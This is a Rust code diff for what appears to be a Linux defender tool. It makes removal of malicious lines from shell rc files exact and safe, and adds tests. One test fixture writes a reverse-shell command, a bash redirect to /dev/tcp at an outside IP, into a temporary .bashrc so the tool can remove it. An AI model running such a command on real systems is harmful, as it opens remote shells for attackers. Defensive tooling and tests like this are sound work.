@@ -191,6 +191,75 @@ pub fn redact_shadow_line(line: &str) -> String {
     fields.join(":")
 }
 
+/// Remove every line of `original` equal to `needle` (both trimmed). When a
+/// removed line opens a `{` block (a shell function header), the block's
+/// lines up to the matching `}` go with it. Returns the new text and how many
+/// lines were removed, or why nothing could be removed.
+pub fn remove_matching_lines(
+    original: &str,
+    needle: &str,
+) -> std::result::Result<(String, usize), &'static str> {
+    let needle = needle.trim();
+    if needle.is_empty() {
+        return Err("empty pattern");
+    }
+    let lines: Vec<&str> = original.lines().collect();
+    let mut keep = vec![true; lines.len()];
+    let mut removed = 0usize;
+    let mut i = 0;
+    while i < lines.len() {
+        if lines[i].trim() != needle {
+            i += 1;
+            continue;
+        }
+        let mut depth = brace_delta(lines[i]);
+        let mut end = i;
+        while depth > 0 {
+            end += 1;
+            if end >= lines.len() {
+                return Err("matched a block that never closes");
+            }
+            depth += brace_delta(lines[end]);
+        }
+        for k in &mut keep[i..=end] {
+            *k = false;
+        }
+        removed += end - i + 1;
+        i = end + 1;
+    }
+    if removed == 0 {
+        return Err("line not found");
+    }
+    let out: String = lines
+        .iter()
+        .zip(&keep)
+        .filter(|(_, k)| **k)
+        .map(|(l, _)| format!("{l}\n"))
+        .collect();
+    Ok((out, removed))
+}
+
+/// Opening minus closing braces on a line, ignoring anything after a `#`.
+fn brace_delta(line: &str) -> i64 {
+    let code = line.split('#').next().unwrap_or("");
+    code.matches('{').count() as i64 - code.matches('}').count() as i64
+}
+
+/// `Some(true)` if `bash -n` accepts `text`, `Some(false)` if it rejects it,
+/// `None` when bash cannot be run.
+fn shell_syntax_ok(text: &str) -> Option<bool> {
+    use std::io::Write as _;
+    let mut child = std::process::Command::new("bash")
+        .arg("-n")
+        .stdin(std::process::Stdio::piped())
+        .stdout(std::process::Stdio::null())
+        .stderr(std::process::Stdio::null())
+        .spawn()
+        .ok()?;
+    child.stdin.take()?.write_all(text.as_bytes()).ok()?;
+    child.wait().ok().map(|s| s.success())
+}
+
 /// State shared by every check in a single run.
 #[derive(Clone)]
 pub struct DefenderContext {
@@ -502,6 +571,16 @@ impl DefenderContext {
     /// Matches lines that contain `line_content` (substring match, trimmed).
     /// Returns `true` if the line was found and the file was rewritten cleanly.
     pub fn remove_line_from_file_logged(&self, path: &Path, line_content: &str) -> bool {
+        if line_content.trim().is_empty() {
+            // An empty needle would match every line.
+            let msg = format!(
+                "  refusing to remove an empty line pattern from {}",
+                path.display()
+            );
+            self.log_msg(&msg);
+            let _ = self.log(&msg);
+            return false;
+        }
         let action_msg = format!("══ ACTION: remove line from {} ══", path.display());
         self.log_msg(&action_msg);
         let _ = self.log(&action_msg);
@@ -554,30 +633,39 @@ impl DefenderContext {
             }
         }
 
-        let line_count_before = original.lines().count();
-        let filtered: Vec<&str> = original
-            .lines()
-            .filter(|l| !l.trim().contains(line_content.trim()))
-            .collect();
-        let line_count_after = filtered.len();
+        let (new_content, removed_count) = match remove_matching_lines(&original, line_content) {
+            Ok(r) => r,
+            Err(why) => {
+                let msg = format!("  {why} — no change made");
+                self.log_msg(&msg);
+                let _ = self.log(&msg);
+                return false;
+            }
+        };
 
-        if line_count_before == line_count_after {
-            let msg = "  line not found — no change made";
-            self.log_msg(msg);
-            let _ = self.log(msg);
+        // Never turn a valid shell rc file into a broken one (a function left
+        // with an empty body is a syntax error that breaks every login).
+        if shell_syntax_ok(&original) == Some(true) && shell_syntax_ok(&new_content) == Some(false)
+        {
+            let msg = format!(
+                "  removing it would leave {} with a shell syntax error — edit by hand",
+                path.display()
+            );
+            self.log_msg(&msg);
+            let _ = self.log(&msg);
             return false;
         }
 
-        let new_content = filtered.join("\n") + "\n";
         match std::fs::write(path, new_content) {
             Ok(()) => {
-                let msg = format!("  removed {} line(s)", line_count_before - line_count_after);
+                let msg = format!("  removed {} line(s)", removed_count);
                 self.log_msg(&msg);
                 let _ = self.log(&msg);
 
                 // Proof: verify line is absent
+                let needle = line_content.trim();
                 let proof = std::fs::read_to_string(path)
-                    .map(|s| !s.contains(line_content.trim()))
+                    .map(|s| !s.lines().any(|l| l.trim() == needle))
                     .unwrap_or(false);
                 let proof_msg = format!("══ PROOF: line absent={} in {} ══", proof, path.display());
                 self.log_msg(&proof_msg);
@@ -760,19 +848,29 @@ impl DefenderContext {
 mod tests {
     use super::*;
 
+    /// One quarantine directory for every test in this module, set once:
+    /// tests run in parallel and share the process environment.
+    fn test_quarantine() -> &'static Path {
+        static DIR: std::sync::OnceLock<PathBuf> = std::sync::OnceLock::new();
+        DIR.get_or_init(|| {
+            let dir = tempfile::TempDir::new().unwrap().keep();
+            // SAFETY: set exactly once, before any test in this module reads it.
+            unsafe { std::env::set_var("LINUX_DEFENDER_QUARANTINE_DIR", &dir) };
+            dir
+        })
+    }
+
     /// One test so the env override is set once, before any quarantine call.
     #[test]
     fn quarantine_moves_and_copies_instead_of_deleting() {
-        let q = tempfile::TempDir::new().unwrap();
-        // SAFETY: only this test reads or writes the variable.
-        unsafe { std::env::set_var("LINUX_DEFENDER_QUARANTINE_DIR", q.path()) };
+        let q = test_quarantine();
 
         let work = tempfile::TempDir::new().unwrap();
         let file = work.path().join("evil.sh");
         std::fs::write(&file, "payload").unwrap();
         let moved = quarantine(&file).unwrap();
         assert!(!file.exists());
-        assert!(moved.starts_with(q.path()));
+        assert!(moved.starts_with(q));
         assert!(moved.ends_with(file.strip_prefix("/").unwrap()));
         assert_eq!(std::fs::read_to_string(&moved).unwrap(), "payload");
 
@@ -789,7 +887,7 @@ mod tests {
         assert!(kept.exists());
         assert_eq!(std::fs::read_to_string(copy).unwrap(), "alias ls='ls'\n");
 
-        let mode = std::fs::metadata(q.path()).unwrap().permissions().mode() & 0o777;
+        let mode = std::fs::metadata(q).unwrap().permissions().mode() & 0o777;
         assert_eq!(mode, 0o700);
 
         let site = work.path().join("html");
@@ -822,6 +920,35 @@ mod tests {
         for bt in crate::core::BoxType::ALL {
             let ctx = DefenderContext::new(PathBuf::from("/dev/null"), false).with_box_type(*bt);
             assert_eq!(ctx.box_type(), *bt);
+        }
+    }
+
+    #[test]
+    fn line_removal_is_exact_and_takes_whole_function_blocks() {
+        let rc = "export PATH=/usr/bin\npasswd () {\n    echo blocked\n}\nalias ll='ls -l'\n";
+        let (out, n) = remove_matching_lines(rc, "passwd () {").unwrap();
+        assert_eq!(n, 3);
+        assert_eq!(out, "export PATH=/usr/bin\nalias ll='ls -l'\n");
+
+        // Substrings no longer match.
+        assert!(remove_matching_lines("export A=curl-helper\n", "curl").is_err());
+        assert!(remove_matching_lines("a\nb\n", "").is_err());
+        assert!(remove_matching_lines("f() {\n  x\n", "f() {").is_err());
+    }
+
+    #[test]
+    fn edit_that_would_break_shell_syntax_is_refused() {
+        test_quarantine();
+        let dir = tempfile::TempDir::new().unwrap();
+        let rc = dir.path().join(".bashrc");
+        let text = "greet() {\n  bash -i >& /dev/tcp/1.2.3.4/9 0>&1\n}\n";
+        std::fs::write(&rc, text).unwrap();
+        let (tx, _rx) = std::sync::mpsc::channel();
+        let ctx = DefenderContext::new(dir.path().join("r.txt"), false).with_progress(tx);
+        if shell_syntax_ok("true\n") == Some(true) {
+            // Leaving `greet() {\n}` would be a syntax error.
+            assert!(!ctx.remove_line_from_file_logged(&rc, "bash -i >& /dev/tcp/1.2.3.4/9 0>&1"));
+            assert_eq!(std::fs::read_to_string(&rc).unwrap(), text);
         }
     }
 
